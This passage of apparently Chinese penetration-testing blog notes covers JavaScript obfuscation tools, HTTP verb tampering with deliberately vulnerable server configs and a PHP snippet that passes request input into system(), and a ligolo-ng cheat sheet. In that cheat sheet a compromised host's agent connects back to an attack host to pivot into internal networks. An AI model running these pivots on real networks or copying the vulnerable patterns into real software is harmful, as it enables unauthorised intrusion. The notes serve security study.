<code>(p,a,c,k,e,d)</code> 函数引用它们来重建原始代码。不同打包程序的 <code>(p,a,c,k,e,d)</code> 可能有所不同。但是，它通常包含原始代码中单词和符号打包时的特定顺序，以便确定在执行过程中如何对它们进行排序。</p><p>对这行代码进行混淆，使其更加晦涩难懂。首先，我们尝试使用<a href="http://beautifytools.com/javascript-obfuscator.php">BeautifyTools</a>来混淆代码：</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202504161732034.png" alt="image.png"></p><h2 id="Advanced-Obfuscation"><a href="#Advanced-Obfuscation" class="headerlink" title="Advanced Obfuscation"></a>Advanced Obfuscation</h2><h3 id="Obfuscator"><a href="#Obfuscator" class="headerlink" title="Obfuscator"></a>Obfuscator</h3><p>工具 <a href="https://obfuscator.io/">https://obfuscator.io</a>，在点击 <code>obfuscate</code> 之前， <code>String Array Encoding</code> 选择 <code>Base64</code>， 如下图所示：</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202504161737356.png" alt="image.png"></p><p>输入如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;HTB JavaScript Deobfuscation Module&#x27;</span>);</span><br></pre></td></tr></table></figure><p>点击 <code>obfuscate</code>，得到如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_0x1ea5</span>(<span class="params">_0x342a02,_0x437cdc</span>)&#123;<span class="keyword">var</span> _0x468e45=<span class="title function_">_0x468e</span>();<span class="keyword">return</span> _0x1ea5=<span class="keyword">function</span>(<span class="params">_0x1ea503,_0x19f93b</span>)&#123;_0x1ea503=_0x1ea503-<span class="number">0x82</span>;<span class="keyword">var</span> _0x1eb7f1=_0x468e45[_0x1ea503];<span class="keyword">if</span>(_0x1ea5[<span class="string">&#x27;PDpUPj&#x27;</span>]===<span class="literal">undefined</span>)&#123;<span class="keyword">var</span> _0x4e39de=<span class="keyword">function</span>(<span class="params">_0x1b9fc0</span>)&#123;<span class="keyword">var</span> _0x1e6757=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&#x27;</span>;<span class="keyword">var</span> _0x1b055f=<span class="string">&#x27;&#x27;</span>,_0x11249b=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x553243=<span class="number">0x0</span>,_0x20533e,_0x3014eb,_0x4eae94=<span class="number">0x0</span>;_0x3014eb=_0x1b9fc0[<span class="string">&#x27;charAt&#x27;</span>](_0x4eae94++);~_0x3014eb&amp;&amp;(_0x20533e=_0x553243%<span class="number">0x4</span>?_0x20533e*<span class="number">0x40</span>+<span class="attr">_0x3014eb</span>:_0x3014eb,_0x553243++%<span class="number">0x4</span>)?_0x1b055f+=<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span>&amp;_0x20533e&gt;&gt;(-<span class="number">0x2</span>*_0x553243&amp;<span class="number">0x6</span>)):<span class="number">0x0</span>)&#123;_0x3014eb=_0x1e6757[<span class="string">&#x27;indexOf&#x27;</span>](_0x3014eb);&#125;<span class="keyword">for</span>(<span class="keyword">var</span> _0x2e3b1e=<span class="number">0x0</span>,_0x1a0b41=_0x1b055f[<span class="string">&#x27;length&#x27;</span>];_0x2e3b1e&lt;_0x1a0b41;_0x2e3b1e++)&#123;_0x11249b+=<span class="string">&#x27;%&#x27;</span>+(<span class="string">&#x27;00&#x27;</span>+_0x1b055f[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x2e3b1e)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);&#125;<span class="keyword">return</span> <span class="built_in">decodeURIComponent</span>(_0x11249b);&#125;;_0x1ea5[<span class="string">&#x27;EFfvlg&#x27;</span>]=_0x4e39de,_0x342a02=<span class="variable language_">arguments</span>,_0x1ea5[<span class="string">&#x27;PDpUPj&#x27;</span>]=!![];&#125;<span class="keyword">var</span> _0x45414f=_0x468e45[<span class="number">0x0</span>],_0x35dbe2=_0x1ea503+_0x45414f,_0x34124d=_0x342a02[_0x35dbe2];<span class="keyword">return</span>!_0x34124d?(_0x1eb7f1=_0x1ea5[<span class="string">&#x27;EFfvlg&#x27;</span>](_0x1eb7f1),_0x342a02[_0x35dbe2]=_0x1eb7f1):_0x1eb7f1=_0x34124d,_0x1eb7f1;&#125;,<span class="title function_">_0x1ea5</span>(_0x342a02,_0x437cdc);&#125;<span class="keyword">var</span> _0x57b9de=_0x1ea5;<span class="keyword">function</span> <span class="title function_">_0x468e</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x39b15a=[<span class="string">&#x27;nJbNzNzQzxy&#x27;</span>,<span class="string">&#x27;mtG0odi5nNPiruLwyG&#x27;</span>,<span class="string">&#x27;Bg9N&#x27;</span>,<span class="string">&#x27;otm3otm4zwrHy1Pi&#x27;</span>,<span class="string">&#x27;ntiYotq4tvfrs2jg&#x27;</span>,<span class="string">&#x27;mtbVAw1WvgS&#x27;</span>,<span class="string">&#x27;mwn6uKrSsW&#x27;</span>,<span class="string">&#x27;ntm1ndfrBwToBfu&#x27;</span>,<span class="string">&#x27;otq1nJzZAu10v2m&#x27;</span>,<span class="string">&#x27;mtGWrwzwEezR&#x27;</span>,<span class="string">&#x27;mZy0ntzdC1zWt3e&#x27;</span>,<span class="string">&#x27;mZu3yKPkELrb&#x27;</span>,<span class="string">&#x27;mJmYmJK0n1fSvuzlsa&#x27;</span>];_0x468e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span> _0x39b15a;&#125;;<span class="keyword">return</span> <span class="title function_">_0x468e</span>();&#125;(<span class="keyword">function</span>(<span class="params">_0x5a6ca7,_0x3cd39a</span>)&#123;<span class="keyword">var</span> _0x3b3990=_0x1ea5,_0x63dc26=<span class="title function_">_0x5a6ca7</span>();<span class="keyword">while</span>(!![])&#123;<span class="keyword">try</span>&#123;<span class="keyword">var</span> _0x5336c5=-<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x89</span>))/<span class="number">0x1</span>*(<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x87</span>))/<span class="number">0x2</span>)+-<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x86</span>))/<span class="number">0x3</span>+-<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x84</span>))/<span class="number">0x4</span>+<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x8c</span>))/<span class="number">0x5</span>*(<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x8b</span>))/<span class="number">0x6</span>)+-<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x8e</span>))/<span class="number">0x7</span>*(<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x8d</span>))/<span class="number">0x8</span>)+-<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x8a</span>))/<span class="number">0x9</span>*(-<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x88</span>))/<span class="number">0xa</span>)+<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x82</span>))/<span class="number">0xb</span>*(<span class="built_in">parseInt</span>(<span class="title function_">_0x3b3990</span>(<span class="number">0x83</span>))/<span class="number">0xc</span>);<span class="keyword">if</span>(_0x5336c5===_0x3cd39a)<span class="keyword">break</span>;<span class="keyword">else</span> _0x63dc26[<span class="string">&#x27;push&#x27;</span>](_0x63dc26[<span class="string">&#x27;shift&#x27;</span>]());&#125;<span class="keyword">catch</span>(_0x1e8c0c)&#123;_0x63dc26[<span class="string">&#x27;push&#x27;</span>](_0x63dc26[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;&#125;(_0x468e,<span class="number">0x580b5</span>),<span class="variable language_">console</span>[<span class="title function_">_0x57b9de</span>(<span class="number">0x85</span>)](<span class="string">&#x27;HTB\x20JavaScript\x20Deobfuscation\x20Module&#x27;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202504161745713.png" alt="image.png"></p><h3 id="More-Obfuscation"><a href="#More-Obfuscation" class="headerlink" title="More Obfuscation"></a>More Obfuscation</h3><p>以下混淆器通常会使代码执行&#x2F;编译非常缓慢。</p><h4 id="JSFuck"><a href="#JSFuck" class="headerlink" title="JSFuck"></a>JSFuck</h4><p><a href="https://jsfuck.com/">JSFuck</a> 是一种基于 JavaScript 原子部分的深奥且具有教育意义的编程风格。它仅使用六个不同的字符来编写和执行代码。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202504161747268.png" alt="image.png"></p><h4 id="JJ-Encode"><a href="#JJ-Encode" class="headerlink" title="JJ Encode"></a>JJ Encode</h4><p><a href="https://utf-8.jp/public/jjencode.html">JJ Encode</a> </p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202504161751571.png" alt="image.png"></p><h4 id="AA-Encode"><a href="#AA-Encode" class="headerlink" title="AA Encode"></a>AA Encode</h4><p><a href="https://utf-8.jp/public/aaencode.html">AA Encode</a></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202504161751610.png" alt="image.png"></p><h1 id="Deobfuscation"><a href="#Deobfuscation" class="headerlink" title="Deobfuscation"></a>Deobfuscation</h1><h3 id="unPacker"><a href="#unPacker" class="headerlink" title="unPacker"></a>unPacker</h3><p><a href="https://matthewfl.com/unPacker.html">unPacker</a> JS 反混淆工具</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202504161758817.png" alt="Screenshot 2025-04-16 at 17.58.26.png"></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP Verb Tampering</title>
      <link href="/2024/09/20/pentest/web-pentest/HTTP%20Verb%20Tampering/"/>
      <url>/2024/09/20/pentest/web-pentest/HTTP%20Verb%20Tampering/</url>
      
        <content type="html"><![CDATA[<p><a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering">HTTP Verb Tampering</a>利用接受 HTTP 动词和方法的 Web 服务器。可以通过使用意外方法发送恶意请求来利用此攻击，这可能导致绕过 Web 应用程序的授权机制，甚至绕过其针对其他 Web 攻击的安全控制。</p><p>HTTP 有<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods">9 种不同的动词</a>，常用的 HTTP Verb</p><table><thead><tr><th>Verb</th><th>Description</th></tr></thead><tbody><tr><td><code>GET</code></td><td>请求特定资源。可以通过 URL 中的查询字符串将附加数据传递给服务器（例如<code>?param=value</code>）。</td></tr><tr><td><code>POST</code></td><td>将数据发送到服务器。它可以处理多种类型的输入，例如文本、PDF 和其他形式的二进制数据。此数据附加在标头后面的请求正文中。POST 方法通常用于发送信息（例如表单&#x2F;登录）或将数据（例如图像或文档）上传到网站。</td></tr><tr><td><code>HEAD</code></td><td>请求向服务器发出 GET 请求时返回的标头。它不返回请求正文，通常用于在下载资源之前检查响应长度。</td></tr><tr><td><code>PUT</code></td><td>在服务器上创建新资源。如果在未进行适当控制的情况下允许此方法，则会导致上传恶意资源。</td></tr><tr><td><code>DELETE</code></td><td>删除 Web 服务器上的现有资源。如果没有得到妥善保护，可能会因删除 Web 服务器上的关键文件而导致拒绝服务 (DoS)。</td></tr><tr><td><code>OPTIONS</code></td><td>返回有关服务器的信息，例如其接受的方法。</td></tr><tr><td><code>PATCH</code></td><td>对指定位置的资源应用部分修改。</td></tr><tr><td><code>TRACE</code></td><td>回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td><code>CONNECT</code></td><td>HTTP&#x2F;1.1协议中预留给能够将连接改为隧道方式的代理服务器。通常用于SSL加密服务器的连接（经由非加密的HTTP代理服务器）。</td></tr></tbody></table><h1 id="Insecure-Configurations"><a href="#Insecure-Configurations" class="headerlink" title="Insecure Configurations"></a>Insecure Configurations</h1><p>Web 服务器的身份验证配置可能仅限于特定的 HTTP 方法，这会导致某些 HTTP 方法无需身份验证即可访问。</p><h2 id="Apache-Web"><a href="#Apache-Web" class="headerlink" title="Apache Web"></a>Apache Web</h2><p> Apache Web 服务器存在漏洞的配置示例，该配置位于站点配置文件（例如 <code>000-default.conf</code>）或 <code>.htaccess</code> 网页配置文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/www/html/admin&quot;&gt;  </span><br><span class="line">    AuthType Basic  </span><br><span class="line">    AuthName &quot;Admin Panel&quot;  </span><br><span class="line">    AuthUserFile /etc/apache2/.htpasswd  </span><br><span class="line">    &lt;Limit GET&gt;  </span><br><span class="line">        Require valid-user  </span><br><span class="line">    &lt;/Limit&gt;  </span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>此配置正在设置管理 Web 目录的授权配置。但是，由于使用了 <code>&lt;Limit GET&gt;</code> 关键字，<code>Require valid-user</code> 设置仅适用于 GET 请求，因此页面只能通过 <code>POST</code> 请求访问。即使同时指定了 <code>GET</code> 和 <code>POST</code>，页面也只能通过其他方法访问，例如 <code>HEAD</code> 或 <code>OPTIONS</code>。</p><h2 id="Tomcat-Web"><a href="#Tomcat-Web" class="headerlink" title="Tomcat Web"></a>Tomcat Web</h2><p>以下示例显示了 Tomcat Web 服务器配置的相同漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;  </span><br><span class="line">    &lt;web-resource-collection&gt;  </span><br><span class="line">        &lt;url-pattern&gt;/admin/*&lt;/url-pattern&gt;  </span><br><span class="line">        &lt;http-method&gt;GET&lt;/http-method&gt;  </span><br><span class="line">    &lt;/web-resource-collection&gt;  </span><br><span class="line">    &lt;auth-constraint&gt;  </span><br><span class="line">        &lt;role-name&gt;admin&lt;/role-name&gt;  </span><br><span class="line">    &lt;/auth-constraint&gt;  </span><br><span class="line">&lt;/security-constraint&gt;</span><br></pre></td></tr></table></figure><p>此配置授权仅限于 <code>GET</code> 方法，这使得可以通过其他 HTTP 方法访问页面。</p><h2 id="ASP-NET"><a href="#ASP-NET" class="headerlink" title="ASP.NET"></a>ASP.NET</h2><p>以下是在 Web 应用程序的 web.config 文件中找到的 ASP.NET 配置的示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;system.web&gt;  </span><br><span class="line">    &lt;authorization&gt;  </span><br><span class="line">        &lt;allow verbs=&quot;GET&quot; roles=&quot;admin&quot;&gt;  </span><br><span class="line">            &lt;deny verbs=&quot;GET&quot; users=&quot;*&quot;&gt;  </span><br><span class="line">        &lt;/deny&gt;  </span><br><span class="line">        &lt;/allow&gt;  </span><br><span class="line">    &lt;/authorization&gt;  </span><br><span class="line">&lt;/system.web&gt;</span><br></pre></td></tr></table></figure><p>此配置中 <code>allow</code> 和 <code>deny</code> 范围仅限于<code>GET</code>方法，这使得可以通过其他 HTTP 方法访问 Web 应用程序。</p><h1 id="Insecure-Coding"><a href="#Insecure-Coding" class="headerlink" title="Insecure Coding"></a>Insecure Coding</h1><p>当 Web 开发人员应用特定过滤器来缓解特定漏洞，但未用该过滤器覆盖所有 HTTP 方法时，就会发生这种情况。以 PHP 为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_REQUEST[&#x27;filename&#x27;])) &#123;  </span><br><span class="line">    if (!preg_match(&#x27;/[^A-Za-z0-9. _-]/&#x27;, $_GET[&#x27;filename&#x27;])) &#123;  </span><br><span class="line">        system(&quot;touch &quot; . $_REQUEST[&#x27;filename&#x27;]);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        echo &quot;Malicious Request Denied!&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>$_REQUEST[&quot;code&quot;]</code>其中包含<code>GET</code>和<code>POST</code>参数。如上过滤器，如果 GET 请求不包含任何坏字符，那么查询将被执行。</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web-Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ligolo-ng</title>
      <link href="/2024/09/12/tools/tunnel/ligolo-ng/"/>
      <url>/2024/09/12/tools/tunnel/ligolo-ng/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">ligolo-ng » help</span><br><span class="line">    __    _             __                       </span><br><span class="line">   / /   (_)___ _____  / /___        ____  ____ _</span><br><span class="line">  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/</span><br><span class="line"> / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / </span><br><span class="line">/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  </span><br><span class="line">        /____/                          /____/   </span><br><span class="line"></span><br><span class="line">  Made in France ♥            by @Nicocha30!</span><br><span class="line">  Version: 0.6.2</span><br><span class="line"></span><br><span class="line">Ligolo-ng - An advanced, yet simple tunneling tool</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">=========</span><br><span class="line">  certificate_fingerprint   Show the current selfcert fingerprint</span><br><span class="line">  clear                     clear the screen</span><br><span class="line">  connect_agent             Attempt to connect to a bind agent</span><br><span class="line">  exit                      exit the shell</span><br><span class="line">  help                      use &#x27;help [command]&#x27; for command help</span><br><span class="line">  ifconfig                  Show agent interfaces</span><br><span class="line">  session                   Change the current relay agent</span><br><span class="line"></span><br><span class="line">Interfaces</span><br><span class="line">==========</span><br><span class="line">  interface_create, ifcreate                Create a new tuntap interface</span><br><span class="line">  interface_delete, ifdel                   Delete a tuntap interface</span><br><span class="line">  interface_list, iflist, route_list        List available tun interfaces</span><br><span class="line">  route_add, add_route, interface_route_add, interface_add_route  Add a route to a network interface</span><br><span class="line">  route_del, del_route, interface_route_del, interface_del_route  Delete a route</span><br><span class="line"></span><br><span class="line">Listeners</span><br><span class="line">=========</span><br><span class="line">  listener_add          Listen on the agent and redirect connections to the desired address</span><br><span class="line">  listener_list         List currently running listeners</span><br><span class="line">  listener_stop         Stop a listener</span><br><span class="line"></span><br><span class="line">Tunneling</span><br><span class="line">=========</span><br><span class="line">  tunnel_list           List active tunnels</span><br><span class="line">  tunnel_start, start   Start relaying connection to the current agent</span><br><span class="line">  tunnel_stop, stop     Stop the tunnel</span><br></pre></td></tr></table></figure><h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Attack Host: 172.16.2.2/16</span><br><span class="line">Target Host1: 172.16.2.3/16 | 192.168.3.3/24</span><br><span class="line">Target Host2: 192.168.3.4/24 | 192.168.4.4/24</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Pivot"><a href="#Pivot" class="headerlink" title="Pivot"></a>Pivot</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host</span></span><br><span class="line">sudo ./proxy -selfcert [-laddr 0.0.0.0:11601]</span><br><span class="line">ligolo-ng » ifcreate --name ligolo1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Target Host1</span></span><br><span class="line">./agent -connect 172.16.2.2:11601 -ignore-cert</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host ligolo-ng</span></span><br><span class="line">ligolo-ng » INFO[0008] Agent joined ......</span><br><span class="line">ligolo-ng » session</span><br><span class="line">[Agent : SESSION] » start --tun ligolo1</span><br><span class="line">[Agent : SESSION] » ifconfig  # 查看 Target Interface</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host</span></span><br><span class="line">sudo ip route add 192.168.3.0/24 dev ligolo1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">OR</span></span><br><span class="line">[Agent : SESSION] » route_add --name ligolo1 --route 192.168.3.0/24</span><br></pre></td></tr></table></figure><h3 id="Double-Pivot"><a href="#Double-Pivot" class="headerlink" title="Double Pivot"></a>Double Pivot</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 Interface</span></span><br><span class="line">ligolo-ng » ifcreate --name ligolo2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加监听器，将此 Agent:11601 端口的流量转发到 Proxy:11601 端口</span></span><br><span class="line">[Agent : SESSION] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Target Host2</span></span><br><span class="line">./agent- connect 192.168.3.3:11601 -ignore-cert</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host ligolo-ng</span></span><br><span class="line">[Agent : SESSION] » session  # 切换会话</span><br><span class="line">[Agent : SESSION-2] » start --tun ligolo2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host</span></span><br><span class="line">sudo ip route add 192.168.4.0/24 dev ligolo2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">OR</span></span><br><span class="line">[Agent : SESSION] » route_add --name ligolo2 --route 192.168.4.0/24</span><br></pre></td></tr></table></figure><h3 id="Setting"><a href="#Setting" class="headerlink" title="Setting"></a>Setting</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">listener 将此 Agent:2222 端口的流量转发到 Proxy:2222 端口</span></span><br><span class="line">[Agent : SESSION] » listener_add --addr 0.0.0.0:2222 --to 127.0.0.1:2222 --tcp </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">File Transfer or ...</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 -m http.server 2222</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Bind Pivot Box</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问 240.0.0.1 可直接与绑定的 Pivot 交互</span></span><br><span class="line">sudo ip route add 240.0.0.1/32 dev ligolo</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Delete Interface</span></span><br><span class="line">ligolo-ng » interface_delete --name ligolo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">OR</span></span><br><span class="line">sudo ip link delete ligolo</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">OR</span></span><br><span class="line">sudo ifconfig ligolo down</span><br><span class="line">sudo ifconfig ligolo delete</span><br></pre></td></tr></table></figure><h2 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h2><h3 id="Pivot-1"><a href="#Pivot-1" class="headerlink" title="Pivot"></a>Pivot</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host</span></span><br><span class="line">sudo ./proxy -selfcert</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Target Host1</span></span><br><span class="line">./agent -connect 172.16.2.2:11601 -ignore-cert</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host ligolo-ng</span></span><br><span class="line">ligolo-ng » INFO[0008] Agent joined ......</span><br><span class="line">ligolo-ng » session</span><br><span class="line">[Agent : SESSION] » start --tun utun3</span><br><span class="line">[Agent : SESSION] » ifconfig  # 查看网络信息</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Attack Host</span></span><br><span class="line">sudo ifconfig utun3 alias 192.168.3.33 255.255.255.0</span><br><span class="line">sudo route add -net 192.168.3.0/24 -interface utun3</span><br></pre></td></tr></table></figure><p>…</p><h3 id="Setting-1"><a href="#Setting-1" class="headerlink" title="Setting"></a>Setting</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Delete Interface</span></span><br><span class="line">sudo ifconfig utun3 inet 0.0.0.0 netmask 255.255.255.0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Delete IP</span></span><br><span class="line">sudo ifconfig utun3 delete 192.168.9.9</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Delete Route</span></span><br><span class="line">sudo route delete -net 192.168.9.1/24 -interface utun3</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tunnel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hydra</title>
      <link href="/2024/09/09/tools/crack/hydra/"/>
      <url>/2024/09/09/tools/crack/hydra/</url>
      
